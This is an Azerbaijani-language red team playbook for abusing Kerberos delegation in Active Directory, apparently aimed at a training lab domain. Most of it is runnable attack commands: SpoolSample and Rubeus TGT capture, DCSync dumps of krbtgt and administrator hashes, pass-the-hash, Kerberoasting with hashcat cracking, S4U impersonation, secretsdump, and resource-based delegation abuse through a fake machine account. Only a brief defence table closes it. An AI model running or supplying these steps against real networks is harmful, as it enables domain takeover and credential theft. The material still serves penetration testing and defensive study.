# Kerberos Delegation Abuse Playbook

---

## 1. Unconstrained Delegation Abuse

### 1.1 Enumeration

```powershell
# Unconstrained Delegation aktiv olan bütün kompüterləri tap
Get-DomainComputer -Unconstrained | select name, distinguishedname, operatingsystem

# userAccountControl flag-i ilə daha ətraflı
Get-DomainComputer -Unconstrained -Properties name, dnshostname, useraccountcontrol, operatingsystem

# BloodHound üçün toplayıcı
Invoke-BloodHound -CollectionMethod All -Domain inlanefreight.local
```

### 1.2 TGT Capture (Printer Bug / SpoolSample)

```powershell
# DC-nin TGT-sini capture etmək üçün Printer Bug istifadə et
# Rubeus ilə TGT izləmə — hər 5 saniyədən bir yeni biletləri göstər
.\Rubeus.exe monitor /interval:5 /nowrap

# SpoolSample ilə DC-ni unconstrained host-a authenticate etməyə məcbur et
.\SpoolSample.exe <DC_IP> <UNCONSTRAINED_HOST_IP>

# Oğurlanmış bileti yaddaşa yükləyirik
.\Rubeus.exe ptt /ticket:<BASE64_BİLET_BURAYA>

# Doğrulama
klist
```

### 1.3 DCSync ilə Credential Dump

```powershell
# Bütün domain-in şifrə bazasını (NTDS.dit) kopyalayırıq
lsadump::dcsync /domain:inlanefreight.local /all /csv

# Yalnız krbtgt hash-i
lsadump::dcsync /domain:inlanefreight.local /user:krbtgt

# Domain Admin hash-i
lsadump::dcsync /domain:inlanefreight.local /user:administrator
```

### 1.4 TGT Tələb etmə (Bilinen Parol ilə)

```powershell
# Rubeus ilə TGT asktgt
.\Rubeus.exe asktgt /user:backupadm /domain:INLANEFREIGHT.LOCAL /password:'!qazXSW@' /ptt

# NTLM hash ilə (Pass-the-Hash üsulu)
.\Rubeus.exe asktgt /user:backupadm /domain:INLANEFREIGHT.LOCAL /rc4:<NTLM_HASH> /ptt
```

### 1.5 Kerberoasting (SPN Enumeration + Ticket Dump)

```powershell
# SPN-i olan bütün istifadəçiləri tap
Get-DomainUser -SPN

# AD-Searcher (LDAP-ı birbaşa çağır)
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dc = ($domain.DomainControllers[0]).Name
Get-DomainUser -SPN -DomainController $dc

# Bütün SPN-i olan istifadəçilərin biletlərini çək (Kerberoasting)
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat

# Linux tərəfdən (proxychains ilə)
proxychains GetUserSPNs.py -request -dc-ip 172.16.8.5 INLANEFREIGHT.LOCAL/backupadm:'!qazXSW@'

# Hash-i crack et
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 2. Constrained Delegation Abuse

### 2.1 Nədir?

Constrained Delegation (msDS-AllowedToDelegateTo), bir service account-a **yalnız müəyyən servislərə** başqaları adından bilet tələb etmə icazəsi verir. İki növü var:

| Növ | Protocol | Xüsusiyyət |
|-----|----------|-----------|
| **Kerberos-only** | Kerberos | Yalnız Kerberos biletləri işləyir |
| **Protocol Transition** | S4U2Self + S4U2Proxy | İstənilən istifadəçi adından bilet ala bilər (ən təhlükəlisi) |

---

### 2.2 Enumeration

#### PowerView ilə

```powershell
# Constrained Delegation aktiv olan bütün kompüterləri tap
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto, useraccountcontrol

# Constrained Delegation aktiv olan bütün istifadəçiləri tap
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

# Daha ətraflı — hansi servisə delegate edə bilər
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto | fl

# Yalnız Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION) olanlar
Get-DomainUser | Where-Object {$_.useraccountcontrol -match "TRUSTED_TO_AUTH_FOR_DELEGATION"} | select samaccountname, msds-allowedtodelegateto
```

#### LDAP (AD-Searcher) ilə

```powershell
# LDAP filter ilə constrained delegation axtarışı
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.Filter = "(&(msDS-AllowedToDelegateTo=*)(objectCategory=computer))"
$Searcher.FindAll() | ForEach-Object {
    $_.Properties["name"]
    $_.Properties["msds-allowedtodelegateto"]
}
```

#### Linux / Impacket ilə

```bash
# findDelegation.py ilə bütün delegation-ları tap
findDelegation.py -dc-ip 172.16.8.5 INLANEFREIGHT.LOCAL/backupadm:'!qazXSW@'

# BloodHound ilə toplayıcı
bloodhound-python -d inlanefreight.local -u backupadm -p '!qazXSW@' -c All -ns 172.16.8.5
```

---

### 2.3 İstismar — S4U2Self + S4U2Proxy

#### Scenario: Service Account-ın Hash/Parolu bilinir

```powershell
# Rubeus ilə S4U attack
# 1. Service account-ın TGT-sini al
.\Rubeus.exe asktgt /user:svc_iis /domain:INLANEFREIGHT.LOCAL /password:'Passw0rd!' /nowrap

# 2. S4U2Self + S4U2Proxy ilə Administrator adından bilet al
.\Rubeus.exe s4u /ticket:<BASE64_TGT> /impersonateuser:administrator /msdsspn:"CIFS/fileserver.inlanefreight.local" /ptt

# 3. Doğrulama
klist
dir \\fileserver.inlanefreight.local\C$
```

#### NTLM Hash ilə (Password lazım deyil)

```powershell
# RC4 (NTLM) hash ilə
.\Rubeus.exe s4u /user:svc_iis /rc4:<NTLM_HASH> /impersonateuser:administrator /msdsspn:"CIFS/fileserver.inlanefreight.local" /domain:INLANEFREIGHT.LOCAL /ptt

# AES256 hash ilə (daha stealth)
.\Rubeus.exe s4u /user:svc_iis /aes256:<AES256_HASH> /impersonateuser:administrator /msdsspn:"CIFS/fileserver.inlanefreight.local" /domain:INLANEFREIGHT.LOCAL /ptt /opsec
```

#### Alternativ SPN triki (HOST, HTTP, LDAP)

```powershell
# CIFS əvəzinə HOST — remote kod icrasına gedir
.\Rubeus.exe s4u /user:svc_iis /rc4:<HASH> /impersonateuser:administrator /msdsspn:"HOST/fileserver.inlanefreight.local" /altservice:CIFS /domain:INLANEFREIGHT.LOCAL /ptt

# LDAP — DCSync üçün
.\Rubeus.exe s4u /user:svc_iis /rc4:<HASH> /impersonateuser:administrator /msdsspn:"LDAP/dc01.inlanefreight.local" /domain:INLANEFREIGHT.LOCAL /ptt

# DCSync icra et
lsadump::dcsync /domain:inlanefreight.local /user:krbtgt
```

#### Linux / Impacket ilə

```bash
# getST.py ilə Service Ticket al (S4U2Proxy)
proxychains getST.py -spn CIFS/fileserver.inlanefreight.local \
  -impersonate administrator \
  -dc-ip 172.16.8.5 \
  INLANEFREIGHT.LOCAL/svc_iis:'Passw0rd!'

# Bilet faylını yüklə
export KRB5CCNAME=administrator.ccache

# SMB-yə qoşul
proxychains smbclient.py -k -no-pass fileserver.inlanefreight.local

# Secretsdump ilə credential dump
proxychains secretsdump.py -k -no-pass fileserver.inlanefreight.local
```

---

### 2.4 Resource-Based Constrained Delegation (RBCD) Abuse

```powershell
# Hədəf kompüterin msDS-AllowedToActOnBehalfOfOtherIdentity atributunu dəyiş
# (Domain-ə kompüter əlavə etmə hüququn varsa — default 10 kompüter)

# 1. Yeni saxta kompüter hesabı yarat
New-MachineAccount -MachineAccount FakePC -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)

# 2. Saxta kompüterin SID-ini al
$fakeSID = (Get-DomainComputer FakePC).objectsid

# 3. Hədəf kompüterdə RBCD atributunu yaz
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$fakeSID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer targetpc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 4. Rubeus ilə S4U attack
.\Rubeus.exe s4u /user:FakePC$ /password:'FakePass123!' /impersonateuser:administrator /msdsspn:"CIFS/targetpc.inlanefreight.local" /domain:INLANEFREIGHT.LOCAL /ptt

# 5. Təmizlik — atributu sil
Get-DomainComputer targetpc | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
```

---

### 2.5 Müdafiə Tədbirləri (Blue Team Notu)

| Tövsiyə | Açıqlama |
|---------|---------|
| **Protected Users** qrupuna əlavə et | Bu qrupdakı hesablar delegation-a icazə vermir |
| **Account is sensitive** flag-i qoy | "Account is sensitive and cannot be delegated" seçimi |
| **Privileged accounts** üçün delegation-ı söndür | DA, EA, Schema Admin kimi hesablarda heç vaxt delegation olmamalıdır |
| **Kerberos Armoring (FAST)** aktiv et | S4U2Self hücumlarını çətinləşdirir |
| **LDAP Signing + Channel Binding** | RBCD üçün istifadə olunan LDAP relay-larının qarşısını alır |

---

*Playbook hazırlanma məqsədi: Penetration Testing / Red Team Lab mühiti*
